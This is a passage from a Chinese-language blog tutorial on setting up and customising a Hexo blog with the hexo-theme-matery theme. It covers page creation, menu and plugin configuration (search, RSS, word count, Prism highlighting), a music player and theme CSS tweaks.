src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/c9a156cee4074858951dbfe6050cfd8b.png"></p><h2 id="04-利用hexo-theme-matery美化hexo"><a href="#04-利用hexo-theme-matery美化hexo" class="headerlink" title="04 利用hexo-theme-matery美化hexo"></a>04 利用hexo-theme-matery美化hexo</h2><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/a16156549b564234baeb4b225c05b210.png"><br>下载 master 分支的最新稳定版的代码，解压缩后将 hexo-theme-matery 的文件夹重命名为matery，复制到Hexo 的 themes<br>可以在themes 文件夹下使用Git clone命令来下载：<br><code>git clone https://github.com/blinkfox/hexo-theme-matery.git</code></p><p>一些不需要或想开启的功能都可以在matery主题下的_config.yml中操作将其功能模块开启（true）或关闭(false)</p><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>下载完后，将站点配置文件中的 theme 值修改为你下载主题的文件名<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/83ac89aa80594d22a135b3f37d2d5435.png"></p><figure class="highlight clean"><table><tbody><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https:<span class="comment">//hexo.io/plugins/</span></span><br><span class="line">## Themes: https:<span class="comment">//hexo.io/themes/</span></span><br><span class="line">theme: matery</span><br></pre></td></tr></tbody></table></figure><p>一些其他在站点目录配置：</p><p>language: zh-CN网站的语言设置</p><p>url: 网站的网站（域名）</p><p>per_page: 12建议修改为 6 的倍数，主题排版比较好</p><h3 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h3><h4 id="1-标签页"><a href="#1-标签页" class="headerlink" title="1.标签页"></a>1.标签页</h4><p><code>hexo new page "tags"</code><br>编辑新建的/source/tags/index.md文件</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2020-02-23 19:37:07</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"tags"</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">"tags"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><h4 id="2、分类页"><a href="#2、分类页" class="headerlink" title="2、分类页"></a>2、分类页</h4><p><code>hexo new page "categories"</code></p><p>编辑新建的/source/categories/index.md文件</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2020-02-23 19:37:07</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"categories"</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">"categories"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><h4 id="3、关于页面"><a href="#3、关于页面" class="headerlink" title="3、关于页面"></a>3、关于页面</h4><p><code>hexo new page "about"</code></p><p>编辑新建的/source/about/index.md文件</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">about</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2020-02-23 19:37:07</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"about"</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">"about"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><h4 id="4、留言板"><a href="#4、留言板" class="headerlink" title="4、留言板"></a>4、留言板</h4><p>hexo new page “contact”<br>编辑新建的/source/contact/index.md文件</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">contact</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2020-02-23 19:37:07</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"contact"</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">"contact"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><h4 id="5、友情链接"><a href="#5、友情链接" class="headerlink" title="5、友情链接"></a>5、友情链接</h4><p><code>hexo new page "friends"</code><br>编辑新建的/source/friends/index.md文件</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">friends</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2020-02-23 19:37:07</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"friends"</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">"friends"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><p>然后在博客 source 目录下新建 _data 目录，在 _data 目录中新建 friends.json 文件，文件内容如下所示：</p><figure class="highlight json"><table><tbody><tr><td class="code"><pre><span class="line">[</span><br><span class="line">{</span><br><span class="line">    <span class="attr">"avatar"</span>: <span class="string">"https://cdn.jsdelivr.net/gh/GreenLeavesl/leaves_img/img/R-C.jpg"</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"Blog"</span>,</span><br><span class="line">    <span class="attr">"introduction"</span>: <span class="string">"CSDN社区"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://blog.csdn.net/hahakenihaoa"</span>,</span><br><span class="line">    <span class="attr">"title"</span>: <span class="string">"CSDN"</span></span><br><span class="line">}, </span><br><span class="line">{</span><br><span class="line">    <span class="attr">"avatar"</span>: <span class="string">"https://cdn.jsdelivr.net/gh/GreenLeavesl/leaves_img/img/OIP-C%20(1).jpg"</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"github"</span>,</span><br><span class="line">    <span class="attr">"introduction"</span>: <span class="string">"github"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://github.com/GreenLeavesl"</span>,</span><br><span class="line">    <span class="attr">"title"</span>: <span class="string">"github"</span></span><br><span class="line">}, </span><br><span class="line">{</span><br><span class="line">    <span class="attr">"avatar"</span>: <span class="string">"https://cdn.jsdelivr.net/gh/GreenLeavesl/leaves_img/img/OIP-C.jpg"</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"gitee"</span>,</span><br><span class="line">    <span class="attr">"introduction"</span>: <span class="string">"leaves"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: <span class="string">"https://gitee.com/GreenLeavesl"</span>,</span><br><span class="line">    <span class="attr">"title"</span>: <span class="string">"gitee"</span></span><br><span class="line">}</span><br><span class="line">]</span><br></pre></td></tr></tbody></table></figure><h4 id="6、添加-404-页面"><a href="#6、添加-404-页面" class="headerlink" title="6、添加 404 页面"></a>6、添加 404 页面</h4><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/02422f6527344918a08432a920659739.png"><br>首先再站点根目录下的 source 文件夹下新建 404.md 文件，里面内容如下：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="number">404</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2020-02-23 19:37:07</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">"404"</span></span><br><span class="line"><span class="attr">layout:</span> <span class="string">"404"</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">"Oops～，我崩溃了！找不到你想要的页面了"</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><p>紧接着再新建主题文件夹的 layout 目录下新建 404.ejs 文件，添加内容如下：<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/46f0cc5c81fd4a07b974089abb5c66c3.png"></p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="comment">/* don't remove. */</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.about-cover</span> {</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">90.2vh</span>;</span></span><br><span class="line"><span class="css">    }</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bg-cover pd-header about-cover"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col s10 offset-s1 m8 offset-m2 l8 offset-l2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"brand"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title center-align"</span>&gt;</span></span><br><span class="line">                        404</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"description center-align"</span>&gt;</span></span><br><span class="line">                        &lt;%= page.description %&gt;</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;% if (theme.banner.enable) { %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 每天切换 banner 图.  Switch banner image every day.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> bannerUrl = <span class="string">"&lt;%- theme.jsDelivr.url %&gt;&lt;%- url_for('/medias/banner/') %&gt;"</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getDay() + <span class="string">'.jpg'</span>;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.bg-cover'</span>).css(<span class="string">'background-image'</span>, <span class="string">'url('</span> + bannerUrl + <span class="string">')'</span>);</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;% } else { %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.bg-cover'</span>).css(<span class="string">'background-image'</span>, <span class="string">'url(&lt;%- theme.jsDelivr.url %&gt;&lt;%- url_for('</span>/medias/banner/<span class="number">0.</span>jpg<span class="string">') %&gt;)'</span>);</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;% } %&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="7、添加自定义页面"><a href="#7、添加自定义页面" class="headerlink" title="7、添加自定义页面"></a>7、添加自定义页面</h4><p>首先在站点目录下的 source 文件夹下新建 aboutme 文件，文件名可自定义，然后编写一个 index.html 放入 aboutme 文件夹下，然后在主题配置文件下的导航配置信息添加下面的配置：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">About:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/</span></span><br><span class="line">    <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-address-card</span></span><br><span class="line">    <span class="attr">children:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">关于我</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/about</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fas</span> <span class="string">fa-user-circle</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Another</span>    <span class="comment">#这是新添加的，在原有配置基础上添加</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">/aboutme</span></span><br><span class="line">        <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-user-secret</span></span><br></pre></td></tr></tbody></table></figure><p>然后在站点配置文件下，找到 skip_render，在后面添加属性，如下：</p><figure class="highlight haml"><table><tbody><tr><td class="code"><pre><span class="line"># 其意思为在对文件进行渲染时跳过aboutme文件下的所有文件</span><br><span class="line">skip_render: </span><br><span class="line">    -<span class="ruby"> aboutme/** </span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby"> aaa/**</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby"> bbb/**</span></span><br></pre></td></tr></tbody></table></figure><h3 id="配置菜单导航"><a href="#配置菜单导航" class="headerlink" title="配置菜单导航"></a>配置菜单导航</h3><p>图标 icon 可以在 <a href="https://fontawesome.com/icons">Font Awesome</a> 中查找</p><figure class="highlight dts"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># main menu navigation url and icon</span></span><br><span class="line"><span class="meta"># 配置菜单导航的名称、路径和图标icon.</span></span><br><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  Index:</span></span><br><span class="line"><span class="symbol">    url:</span> /</span><br><span class="line"><span class="symbol">    icon:</span> fas fa-home</span><br><span class="line"><span class="symbol">  Tags:</span></span><br><span class="line"><span class="symbol">    url:</span> /tags</span><br><span class="line"><span class="symbol">    icon:</span> fas fa-tags</span><br><span class="line"><span class="symbol">  Categories:</span></span><br><span class="line"><span class="symbol">    url:</span> /categories</span><br><span class="line"><span class="symbol">    icon:</span> fas fa-bookmark</span><br><span class="line"><span class="symbol">  Archives:</span></span><br><span class="line"><span class="symbol">    url:</span> /archives</span><br><span class="line"><span class="symbol">    icon:</span> fas fa-archive</span><br><span class="line"><span class="symbol">  About:</span></span><br><span class="line"><span class="symbol">    url:</span> /about</span><br><span class="line"><span class="symbol">    icon:</span> fas fa-user-circle</span><br><span class="line"><span class="symbol">  Contact:</span></span><br><span class="line"><span class="symbol">    url:</span> /contact</span><br><span class="line"><span class="symbol">    icon:</span> fas fa-comments</span><br><span class="line"><span class="symbol">  Friends:</span></span><br><span class="line"><span class="symbol">    url:</span> /friends</span><br><span class="line"><span class="symbol">    icon:</span> fas fa-address-book</span><br></pre></td></tr></tbody></table></figure><h3 id="添加-emoji-表情支持"><a href="#添加-emoji-表情支持" class="headerlink" title="添加 emoji 表情支持"></a>添加 emoji 表情支持</h3><p>需要安装插件 hexo-filter-github-emojis<br><code>npm install hexo-filter-github-emojis --save</code><br>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">githubEmojis:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">github-emoji</span></span><br><span class="line">  <span class="attr">inject:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">styles:</span></span><br><span class="line">  <span class="attr">customEmojis:</span></span><br></pre></td></tr></tbody></table></figure><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>原本的代码显示行号和内容分开了，不美观<br>代码美化需要安装hexo-prism-plugin 插件</p><p><code>npm i -S hexo-prism-plugin</code><br>修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置，主要配置如下：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">highlight:</span><span class="comment">#代码块的设置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span><span class="comment">#开启代码块高亮</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span><span class="comment">#如果未指定语言，则启用自动检测</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span><span class="comment">#显示行数</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">''</span><span class="comment">#用n个空格替换tabs；如果值为空，则不会替换tabs</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="string">ture</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"><span class="comment"># 关闭原有的代码高亮，使用自己的</span></span><br><span class="line"><span class="attr">prism_plugin:</span></span><br><span class="line">  <span class="attr">mode:</span> <span class="string">'preprocess'</span>    <span class="comment"># realtime/preprocess</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">'tomorrow'</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">false</span>    <span class="comment"># default false</span></span><br><span class="line">  <span class="attr">custom_css:</span></span><br></pre></td></tr></tbody></table></figure><p>|—|—|<br>|参数KEY    |可选值|<br>|mode    |realtime (Parse code on browser in real time)|<br>|preprocess |(Preprocess code in node)|<br>|theme    |default <br>coy<br>dark<br>funky<br>okaidia<br>solarizedlight<br>tomorrow<br>twilight<br>如果要更多的选择访问： <a href="https://github.com/ele828/hexo-prism-plugin">hexo-prism-plugin</a>|<br>|line_number |true (Show line numbers)<br>false (Default, Hide line numbers)|<br>|no_assets    |true (Stop loading asset files)<br>false (Default, load script and stylesheets files)|</p><p>注意：</p><p>hexo花括号显示失败的话，需要将hexo版本降级，改成hexo4.2.0版本就好了</p><p>卸载hexo5.0<br>npm uninstall hexo –save</p><p>安装4.2.0版本</p><p>npm install <a href="mailto:hexo@4.2.0">hexo@4.2.0</a> –save</p><h3 id="主题的搜索功能"><a href="#主题的搜索功能" class="headerlink" title="主题的搜索功能"></a>主题的搜索功能</h3><p>需要安装hexo-generator-search插件</p><p><code>npm install hexo-generator-search --save</code></p><p>在Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.<span class="keyword">xml</span></span><br><span class="line">  <span class="title">field</span>: post</span><br></pre></td></tr></tbody></table></figure><h3 id="文章字数统计插件"><a href="#文章字数统计插件" class="headerlink" title="文章字数统计插件"></a>文章字数统计插件</h3><p>需要安装 hexo-wordcount 插件</p><p><code>npm i --save hexo-wordcount</code><br>主题下的 _config.yml 文件中，激活以下配置项即可：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">wordCount:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span> <span class="comment"># 将这个值设置为 true 即可.</span></span><br><span class="line">  <span class="attr">postWordCount:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">min2read:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">totalCount:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><h3 id="添加-RSS-订阅支持"><a href="#添加-RSS-订阅支持" class="headerlink" title="添加 RSS 订阅支持"></a>添加 RSS 订阅支持</h3><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/f7e065b7e89e40d48a54be222de843a5.png"><br>需要安装hexo-generator-feed插件</p><p>npm install hexo-generator-feed –save<br>Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><figure class="highlight dts"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">feed:</span></span><br><span class="line"><span class="symbol">  type:</span> atom</span><br><span class="line"><span class="symbol">  path:</span> atom.xml</span><br><span class="line"><span class="symbol">  limit:</span> <span class="number">20</span></span><br><span class="line"><span class="symbol">  hub:</span></span><br><span class="line"><span class="symbol">  content:</span></span><br><span class="line"><span class="symbol">  content_limit:</span> <span class="number">140</span></span><br><span class="line"><span class="symbol">  content_limit_delim:</span> <span class="string">' '</span></span><br><span class="line"><span class="symbol">  order_by:</span> -date</span><br></pre></td></tr></tbody></table></figure><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 /layout/_partial/footer.ejs 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 config.yml 文件中，默认支持 QQ、GitHub 和邮箱等的配置，你可以在主题文件的 /layout/_partial/social-link.ejs 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/13a9aa63998e4e669c80f659fda8a034.png"></p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">&lt;% if (theme.socialLink.github) { %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%= theme.socialLink.github %&gt;"</span> <span class="attr">class</span>=<span class="string">"tooltipped"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-tooltip</span>=<span class="string">"访问我的GitHub"</span> <span class="attr">data-position</span>=<span class="string">"top"</span> <span class="attr">data-delay</span>=<span class="string">"50"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fab fa-github"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">&lt;% } %&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 source/medias/reward 文件中修改</p><h3 id="配置音乐播放器"><a href="#配置音乐播放器" class="headerlink" title="配置音乐播放器"></a>配置音乐播放器</h3><p>支持接入第三方音乐，如 QQ 音乐，网易云音乐，酷狗音乐等等</p><p>主题的 _config.yml 配置文件中激活 music 配置即可：</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Whether to display the musics.</span></span><br><span class="line"><span class="comment"># 是否在首页显示音乐.</span></span><br><span class="line"><span class="attr">music:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">title:</span> <span class="comment">#非吸底模式有效</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">show:</span> <span class="string">咕咕星的歌单</span></span><br><span class="line">  <span class="attr">autoHide:</span> <span class="literal">true</span>    <span class="comment"># hide automaticaly</span></span><br><span class="line">  <span class="attr">server:</span> <span class="string">netease</span>   <span class="comment">#requiremusic platform: netease, tencent, kugou, xiami, baidu</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">playlist</span>    <span class="comment">#require song, playlist, album, search, artist</span></span><br><span class="line">  <span class="attr">id:</span> <span class="number">2888085740</span>     <span class="comment">#requiresong id / playlist id / album id / search keyword</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span>       <span class="comment"># 开启吸底模式</span></span><br><span class="line">  <span class="attr">autoplay:</span> <span class="literal">false</span>   <span class="comment"># 是否自动播放</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">'#42b983'</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="string">'all'</span>       <span class="comment"># 音频循环播放, 可选值: 'all', 'one', 'none'</span></span><br><span class="line">  <span class="attr">order:</span> <span class="string">'random'</span>   <span class="comment"># 音频循环顺序, 可选值: 'list', 'random'</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="string">'auto'</span>   <span class="comment"># 预加载，可选值: 'none', 'metadata', 'auto'</span></span><br><span class="line">  <span class="attr">volume:</span> <span class="number">0.7</span>       <span class="comment"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span></span><br><span class="line">  <span class="attr">listFolded:</span> <span class="literal">true</span>  <span class="comment"># 列表默认折叠</span></span><br><span class="line">  <span class="attr">hideLrc:</span> <span class="literal">true</span>     <span class="comment"># 隐藏歌词</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>server 可选 netease（网易云音乐），tencent（QQ 音乐），kugou（酷狗音乐），xiami（虾米音乐），</p><p>baidu（百度音乐）。</p><p>type 可选 song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）</p><p>id 获取示例：浏览器打开网易云音乐，点击我喜欢的音乐歌单，地址栏有一串数字，playlist 的 id 即为这串数字。</p></blockquote><h3 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h3><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td>Markdown 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 _config.yml 中的 author</td><td>文章作者</td></tr><tr><td>img</td><td>featureImages 中的某个值</td><td>文章特征图，推荐使用图床</td></tr><tr><td>top</td><td>true</td><td>推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td></tr><tr><td>cover</td><td>false</td><td>v1.0.2 版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td>v1.0.2 版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td></tr><tr><td>toc</td><td>true</td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td></tr><tr><td>mathjax</td><td>false</td><td>是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p>注意:</p><ol><li> 如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。</li><li> date 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。</li><li> 如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。</li><li> 您可以在文章 md 文件的 front-matter 中指定 reprintPolicy 来给单个文章</li></ol></blockquote><h3 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h3><h4 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h4><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">在主题文件的 <span class="regexp">/source/</span>css/matery.css 文件中修改</span><br><span class="line"><span class="regexp">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span></span><br><span class="line">.bg-color {</span><br><span class="line">    background-image: linear-gradient(to right, <span class="comment">#2558FF 0%, #0f9d58 100%);</span></span><br><span class="line">}</span><br><span class="line"><span class="regexp">/*如果想去掉banner图的颜色渐变效果，请将以下的css属性注释掉或者删除掉即可*/</span></span><br><span class="line">@-webkit-keyframes rainbow {</span><br><span class="line">   <span class="regexp">/* 动态切换背景颜色. */</span></span><br><span class="line">}</span><br><span class="line">@keyframes rainbow {</span><br><span class="line">    <span class="regexp">/* 动态切换背景颜色. */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h4><p>在 /source/medias/banner 文件夹中更换你喜欢的 banner 图片，主题代码中是每天动态切换一张，只需 7 张即可。如果你会 JavaScript 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，banner 切换的代码位置在 